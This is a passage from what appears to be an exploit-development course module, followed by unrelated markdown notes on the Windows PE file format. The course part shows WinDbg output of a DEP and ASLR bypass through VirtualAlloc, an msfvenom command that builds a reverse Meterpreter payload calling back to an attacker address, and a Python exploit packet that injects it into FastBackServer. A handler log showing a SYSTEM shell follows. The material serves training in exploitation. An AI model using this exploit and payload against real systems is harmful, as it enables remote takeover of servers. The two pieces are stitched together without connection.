0f613b49 43              inc     ebx
0f613b4a 43              inc     ebx
0f613b4b 43              inc     ebx

0:088> !vprot 0f613b48
BaseAddress:       0f613000
AllocationBase:    0f520000
AllocationProtect: 00000004  PAGE_READWRITE
RegionSize:        0000d000
State:             00001000  MEM_COMMIT
Protect:           00000004  PAGE_READWRITE
Type:              00020000  MEM_PRIVATE
Listing 61 - Memory protections before VirtualAlloc
The return address is correctly aligned, and the current memory protection is set to read- and write-only.
We can now let execution continue until VirtualAlloc completes.
0:088> pt
eax=0f613000 ebx=0610c280 ecx=0f613b04 edx=77251670 esi=f7a6268f edi=00669360
eip=745e2623 esp=0f613b34 ebp=0f61ff80 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
KERNELBASE!VirtualAlloc+0x53:
745e2623 c21000          ret     10h

0:088> !vprot 0f613b48
BaseAddress:       0f613000
AllocationBase:    0f520000
AllocationProtect: 00000004  PAGE_READWRITE
RegionSize:        00001000
State:             00001000  MEM_COMMIT
Protect:           00000040  PAGE_EXECUTE_READWRITE
Type:              00020000  MEM_PRIVATE
Listing 62 - Memory protections after VirtualAlloc
As highlighted in Listing 62, the return value from VirtualAlloc is non-zero, and the memory protections have been updated to readable, writable, and executable. Nice!
The final proof of our success is shown in Listing 63, as we execute the placeholder shellcode on the stack.
0:088> p
eax=0f613000 ebx=0610c280 ecx=0f613b04 edx=77251670 esi=f7a6268f edi=00669360
eip=0f613b48 esp=0f613b48 ebp=0f61ff80 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0f613b48 43              inc     ebx

0:088> p
eax=0f613000 ebx=0610c281 ecx=0f613b04 edx=77251670 esi=f7a6268f edi=00669360
eip=0f613b49 esp=0f613b48 ebp=0f61ff80 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
0f613b49 43              inc     ebx

0:088> p
eax=0f613000 ebx=0610c282 ecx=0f613b04 edx=77251670 esi=f7a6268f edi=00669360
eip=0f613b4a esp=0f613b48 ebp=0f61ff80 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
0f613b4a 43              inc     ebx
Listing 63 - Executing placeholder shellcode
We were able to use our read and write primitives to bypass both ASLR and DEP, then obtain arbitrary code execution. What's left for us? To get a reverse shell.
Exercises
1.	Build the ret2libc-style buffer in the Python code.
2.	Execute the exploit and bypass DEP to obtain arbitrary code execution.
1 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
12.4.2. Getting a Shell
After intensive effort, we have reached the final step of our exploit development. Now that we've obtained arbitrary code execution after bypassing DEP and ASLR, it's time to insert a real shellcode and get a reverse shell back.
Let's start by generating the first stage shellcode. We can use msfvenom to generate a staged reverse Meterpreter payload with no bad characters defined, as shown in Listing 64.
kali@kali:~$ msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f python -v shell
...
Payload size: 678 bytes
Final size of python file: 3306 bytes
shell =  b""
shell += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
shell += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
...
shell += b"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
shell += b"\xff\xd5"
Listing 64 - Payload generation with msfvenom
From our analysis in this module, we know that each connection to FastBackServer creates a new thread. We'll specify thread for the EXITFUNC option to ensure that the application does not crash when we exit our shell.
We previously found the shellcode size to be 678 bytes, which is more than the default 0x100 bytes allotted to the first psCommandBuffer.
In Listing 65, we have increased this size to 0x300 and appended the shellcode through the shell variable after the VirtualAlloc ret2lib information.
print("Sending payload")
# psAgentCommand
buf = pack(">i", 0x400)
buf += bytearray([0x41]*0xC)
buf += pack("<i", 0x80)  # opcode
buf += pack("<i", 0x0)    # 1st memcpy: offset
buf += pack("<i", 0x300)  # 1st memcpy: size field
buf += pack("<i", 0x100)  # 2nd memcpy: offset
buf += pack("<i", 0x100)  # 2nd memcpy: size field
buf += pack("<i", 0x200)  # 3rd memcpy: offset
buf += pack("<i", 0x100)  # 3rd memcpy: size field
buf += bytearray([0x41]*0x8)

# psCommandBuffer
buf += pack("<i", kernelbaseBase + 0x1125d0)
buf += pack("<i", bufAddr + 0x18)
buf += pack("<i", bufAddr + 0x18)
buf += pack("<i", 0x200)
buf += pack("<i", 0x1000)
buf += pack("<i", 0x40)
buf += shell

# Padding
buf += bytearray([0x41]*(0x404-len(buf)))
s.send(buf)

s.close()
print("Shell is incoming!")
Listing 65 - Shellcode is included in the payload packet
Once the final exploit is executed, we'll successfully obtain a reverse Meterpreter shell, as displayed in Listing 66.
msf5 exploit(multi/handler) > exploit

[*] Started HTTP reverse handler on http://192.168.119.120:443
[*] http://192.168.119.120:443 handling request from 192.168.120.10; (UUID: 5sme6pol) Staging x86 payload (181337 bytes) ...
[*] Meterpreter session 1 opened (192.168.119.120:443 -> 192.168.120.10:53063)

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
Listing 66 - Obtaining a reverse Meterpreter shell from FastBackServer
We've obtained a reverse shell by using the read and write primitive, only overwriting two DWORDs on the stack. Very nice!
Exercises
1.	Generate a reverse Meterpreter shellcode and insert it into the exploit.
2.	Update the size field for the first psCommandBuffer and replace the placeholder shellcode with the Meterpreter shellcode in the payload packet.
3.	Obtain a reverse Meterpreter shell from FastBackServer.
12.5. Wrapping Up
This module introduced us to the concept of a write primitive. We then created one through the format string vulnerability and combined it with the read primitive to obtain code execution.
The length and complexity of the attack path shown in both this and the previous module indicates the kind of persistent and creative thinking processes required for advanced exploits targeted against complex applications, such as web browsers.

# Portable Executable File Format

[PE Format](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)

## MS-DOS Header and Stub Program

The **MS-DOS header** is always found at the beginning of the file.

The stub program comes directly after the DOS header and the DOS header is 0x40 bytes in size.
=> **DOS stub** is located at an offset of **0x40**

**e_lfanew**, a LONG (4 bytes), represents the number of bytes from the beginning of the image file to the **PE header**. This distance from the beginning of the file is aka a **file offset**.

### PE Header

The offset of **File header** is 4 bytes after the beginning of the **PE header**.

```
typedef struct _IMAGE_NT_HEADERS {
    DWORD Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER32 OptionalHeader;
} IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;
```

### File Header

```
typedef struct _IMAGE_FILE_HEADER {
    WORD    Machine
    WORD    NumberOfSections;
    DWORD   TimeDateStamp;
    DWORD   PointerToSymbolTable;
    DWORD   NumberOfSymbols;
    WORD    SizeOfOptionalHeader;
    WORD    Characteristics;
} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;
```

**Characteristics** contains a number of flags that characterize the file.
- IMAGE_FILE_EXECUTABLE_IMAGE (0x0002) indicates that the file is executable, a characteristic that is only given to PE images.
- IMAGE_FILE_DLL (0x2000) indicates that the file is a DLL.
- IMAGE_FILE_RELOCS_STRIPPED (0x0001) indicates that the file does not contain a base relocation table and must be loaded at the preferred base address.

Our executable contains 2 flags: 0x2 (IMAGE_FILE_EXECUTABLE_IMAGE) and 0x100 (IMAGE_FILE_32BIT_MACHINE), which indicates that the intended architecture is 32-bit.
=> 0x2 bitwise OR 0x100 = 0x102

The size of the *File Header* is 20 (0x14) bytes

### Optional Header

- **AddressOfEntryPoint** contains the Relative Virtual Address (RVA) of the entry point, the location in the program where execution begins. The **RVA** is an address relative to the base address, where the first bytes of the PE file are loaded into memory. In C and C-related languages, the entry point is located just before the **main** function in execution. It's typically found in the **.text** section by default. 
- **BaseOfCode** contains the RVA of the PE section, which contains executable code. This is typically the *.text* section.
- On disk, **ImageBase** contains the preferred base address at which the first byte of data is loaded into memory. Although the *ImageBase* address is preferred, it may not be available and if the file allows (i.e. if it contains relocation information), it may be loaded at a different address.
- With the base address, we can calculate a Virtual Address (**VA**) by adding to it the RVA (base address + RVA = VA).

The difference between the file offset and RVA of corresponding values is caused by:
- **SectionAlignment** contains the alignment factor in bytes used for sections in **memory**. By default, this is the **page size** of the executable's intended architecture. This is typically 0x1000 and, sections in memory begin at RVAs that are multiples of 0x1000. **BaseOfCode**, which holds the RVA of the .text section, also has the value 0x1000.
- **FileAlignment** indicates the alignment factor in bytes used for sections in the PE image file on **disk**. This means that the file offsets of sections on disk are multiples of this value.

- **SizeOfImage** contains the size in bytes rounded up to a multiple of SectionAlignment of the entire image when loaded into memory. This indicates to the loader the amount of memory that is required to load the image.
- **SizeOfHeaders** contains the size of all headers when rounded up to a multiple of FileAlignment.
- For both SizeOfImage and SizeOfHeaders, the additional space that results from rounding up from the size of data is padded with zeros.

### DataDirectory in Optional Header
**DataDirectory** contains a number of entries for important data structures that may be needed at run-time and functions as an easy way to locate them.

```
typedef struct _IMAGE_OPTIONAL_HEADER {
    ...
    DWORD   NumberOfRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;
```

IMAGE_NUMBEROF_DIRECTORY_ENTRIES is contained in the **NumberOfRvaAndSizes** field in the Optional Header.

```
typedef struct _IMAGE_DATA_DIRECTORY {
    DWORD   VirtualAddress;
    DWORD   Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;
```

Each entry consists of 2 elements. These are the RVA of the data structure and size of the data. 

Each variable is defined as an *index* into the data directory and is associated with a particular data structure.

```
#define IMAGE_DIRECTORY_ENTRY_EXPORT          0   // Export Directory
#define IMAGE_DIRECTORY_ENTRY_IMPORT          1   // Import Directory
#define IMAGE_DIRECTORY_ENTRY_RESOURCE        2   // Resource Directory
#define IMAGE_DIRECTORY_ENTRY_EXCEPTION       3   // Exception Directory
#define IMAGE_DIRECTORY_ENTRY_SECURITY        4   // Security Directory
#define IMAGE_DIRECTORY_ENTRY_BASERELOC       5   // Base Relocation Table
#define IMAGE_DIRECTORY_ENTRY_DEBUG           6   // Debug Directory
#define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE    7   // Architecture Specific Data
#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR       8   // RVA of GP
#define IMAGE_DIRECTORY_ENTRY_TLS             9   // TLS Directory
#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10   // Load Configuration Directory
#define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   11   // Bound Import Directory in headers
#define IMAGE_DIRECTORY_ENTRY_IAT            12   // Import Address Table
#define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13   // Delay Load Import Descriptors
#define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14   // COM Runtime descriptor
```

- **Export Directory**: to resolve the symbols for functions, which are exported by the current PE image and available to be imported by others. allows the loader to *find the address of specific functions that are imported by other modules*. Exports are typically provided by DLLs. In this case, the RVA is "0" and the size is "0", indicating that the executable does not have an export table and does not export any symbols.
- **Import** Directory: to resolve the symbols imported by the executable from other modules. helps the executable *resolve the addresses of imported functions*.
- **Base Relocation Table** helps the loader to load the executable at an address other than the preferred base address. helps the loader *find addresses that must be re-based with respect to the load address used*.
- **Import Address Table (IAT)** is a specific table containing import-related information. On disk, its entries helps the loader *find the virtual addresses of imported functions* and, once those addresses are found, they are overwritten with the corresponding addresses.

### Section Headers
- **VirtualSize**, in the case of an image, is interpreted as the size of the section when loaded into memory
- **VirtualAddress** contains the RVA for the first byte of the section. The RVAs of sections must be a multiple of the alignment factor *SectionAlignment*.
- **PointerToRawData** is the file offset of the beginning of the section on disk. Sections must begin on file offsets that are multiples of the alignment factor *FileAlignment*.
- **SizeOfRawData** contains the size of the initialized data on disk. This number is also rounded up to a multiple of FileAlignment
    - If VirtualSize < SizeOfRawData, the remaining bytes in between the end of the data in the .text section and the beginning of the next section are **null padded** (filled with null bytes).
    - A .text section with a virtual size > the raw size may indicate that the executable has been **packed**.

- **Characteristics** are **section flags** that represent attributes of the section.
    - IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_WRITE, and IMAGE_SCN_MEM_EXECUTE specify that the section can be read, written, or executed, respectively.
    - IMAGE_SCN_CNT_CODE, IMAGE_SCN_CNT_INITIALIZED_DATA, and IMAGE_SCN_CNT_UNINITIALIZED_DATA indicate that a section contains executable code, initialized data, or uninitialized data, respectively.

The Characteristics 0x60000020 is composed of 3 flags that have been combined into a single value using a **bitwise OR** operation: 0x40000000 (IMAGE_SCN_MEM_READ), 0x20000000 (IMAGE_SCN_MEM_EXECUTE), and 0x00000020 (IMAGE_SCN_CNT_CODE).

The .text section is marked as both containing executable code (IMAGE_SCN_CNT_CODE) and as executable (IMAGE_SCN_MEM_EXECUTE). Each section that contains code is also executable, but not all sections that are executable necessarily contain code.
- The IMAGE_SCN_CNT_CODE indicates that the contents of the section are executable code
- IMAGE_SCN_MEM_EXECUTE indicates that the memory range that contains the code is capable of being executed.

### Important Standard Sections
- **.text** section typically contains executable code and is readable and executable but *not writable*.
- **.data** section contains **initialized** variables, i.e., these variables are assigned a specific initial value at compile time. This includes global and static variables that are initialized. The values can be changed at any point during run-time. => the .data section is both readable and *writable*.
- **.bss** section contains **uninitialized** variables, i.e., the static and global variables are not assigned a specific initial value at compile-time (to take up less space on disk). On Windows and other OSs, the .bss section is initialized to zero in memory. Because it is set during run-time, it is both readable and *writable*, like the .data section.
- **.rdata** contains **constant** initialized data and is *read-only*. This data may be constant global and static variables or many other data types.
- **.rsrc** section contains additional resources (icons, bitmaps, menus, strings, etc.) that the image may use for things like multi-language support with each language being supported by a particular resource. This section is marked as *read-only*.
- **.reloc** contains relocation data that helps the loader re-base the image if it cannot be loaded at its preferred base address. To do this, there must be a base relocation table, which consists of base relocation blocks. These blocks each represent a single page and contain the offsets of each memory location where re-basing must be performed and the type of re-basing that must be applied to it.
- **.edata** section allows the symbols exported by the PE image to be imported by another module. In order to use an imported symbol, the PE image that imports it must be able to resolve its address, something that export data helps with.
- **.idata** section allows an image to resolve the symbols that it imports from other modules to addresses at run-time.

### Export Directory Table
.edata is typically merged into .rdata by Visual Studio during the compilation process

```
typedef struct _IMAGE_EXPORT_DIRECTORY {
    DWORD   Characteristics;
    DWORD   TimeDateStamp;
    WORD    MajorVersion;
    WORD    MinorVersion;
    DWORD   Name;
    DWORD   Base;
    DWORD   NumberOfFunctions;
    DWORD   NumberOfNames;
    DWORD   AddressOfFunctions;     // RVA: Export Address Table
    DWORD   AddressOfNames;         // RVA: Export Name Pointer Table
    DWORD   AddressOfNameOrdinals;  // RVA: Ordinal Table
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
```

To store the location of other export-related tables.
- AddressOfFunctions contains the **Export Address Table**,
- AddressOfNames contains the **Export Name Pointer Table**, and
- AddressOfNameOrdinals contains the **Ordinal Table**.

Symbols can be referred to in 2 ways, either by an ordinal number associated with them or by name (a string).

- Suppose imports take place using **ordinals**. An ordinal, in this case, is simply an index into the *Export Address Table*, which contains the RVA of each symbol as entries.
- If **names** are used, the loader uses the *Export Name Pointer Table* and the *Ordinal Table*. These tables correspond in the sense that the n-th entry of the Ordinal Table contains the ordinal for the symbol pointed to by the n-th entry of the Export Name Pointer Table. In this case, the loader first searches the Export Name Pointer Table for the symbol name and when it finds it, derives the ordinal from the corresponding entry in the Ordinal Table. It then uses this ordinal to find the symbol's RVA in the Export Address Table.

### Import Directory Table

.idata is typically merged into .rdata by Visual Studio during the compilation process

The **.idata** section contains information that allows an image to resolve the symbols that it imports from other modules to addresses at run-time. Import information is important for **malware analysis** because the functions that are imported and used can tell us a lot about what the program does and can help us identify malicious software.
The import information begins with the Import Directory Table, which is a sequence of entries, one for each DLL imported.

```
typedef struct _IMAGE_IMPORT_DESCRIPTOR {
    union {
        DWORD   Characteristics;
        DWORD   OriginalFirstThunk; // RVA: Import Lookup Table (ILT)
    } DUMMYUNIONNAME;
    DWORD   TimeDateStamp;
    DWORD   ForwarderChain;
    DWORD   Name;
    DWORD   FirstThunk;             // RVA: Import Address Table (IAT)
} IMAGE_IMPORT_DESCRIPTOR;
```

- **Name** is the RVA of the string that contains the DLL name.
- **OriginalFirstThunk** and **FirstThunk** point to the **Import Lookup / Name Table (ILT / INT)** and **Import Address Table (IAT)**, respectively, for the specific DLL. Until binding, in which imported symbols are resolved to addresses, these two tables have the same content and consist of entries for each imported function. When the addresses of these imported functions are resolved, the IAT entries are overwritten with the resolved addresses.

The entries of the ILT end IAT are defined by the IMAGE_THUNK_DATA structure.
```
typedef struct _IMAGE_THUNK_DATA32 {
    union {
        DWORD ForwarderString;      
        DWORD Function;             
        DWORD Ordinal;
        DWORD AddressOfData;       
    } u1;
} IMAGE_THUNK_DATA32;
```
the DWORD in IMAGE_THUNK_DATA32 can be interpreted in different ways. For executable files, it has two possible interpretations, which correspond to the 2 different ways that symbols can be referred to. The first is as an Ordinal number. The second, which eventually leads to the symbol name, is, as AddressOfData, an RVA to an IMAGE_IMPORT_BY_NAME structure in the Hint/Name Table.
Note that we can tell whether ordinals or symbol names are used by inspecting the highest bit of the Ordinal/AddressOfData field. If it's set, ordinals are used. If not, imports use names.
Let's inspect IMAGE_IMPORT_BY_NAME.
```
typedef struct _IMAGE_IMPORT_BY_NAME {
    WORD    Hint;
    CHAR   Name[1];
} IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;
```
- **Hint**, which is an index into the Export Name Pointer Table. This table belongs to the export data of the DLL and contains pointers to the function name. We discussed it above in the context of the Export Directory structure.
The second field is a string that contains the name of the imported function. The name is used to confirm that the hint has located the correct entry in the Export Name Pointer Table or, if the hint does not locate it, to find the correct entry. Recall that this entry is used to find the ordinal for the symbol and, ultimately, its RVA. Once the RVA is found, the loader overwrites the entry in the IAT with this value.

### Inspecting PE Files with WinDbg

| **Command** | **Description** |
| --------------|-------------------|
| `lm` | find the load address, which may not the same value contained in ImageBase, the preferred base address, `00770000` |
| `dt ntdll!_IMAGE_DOS_HEADER 00770000` | inspect the contents of MS-DOS header, `e_lfanew: 0n248` |
| `dt ntdll!_IMAGE_NT_HEADERS 00770000+0n248` | inspect the PE file header |
| `!dh -h` | dumps headers from an image based at address |
| `!dh -f 00770000` | display the PE file headers of the modules |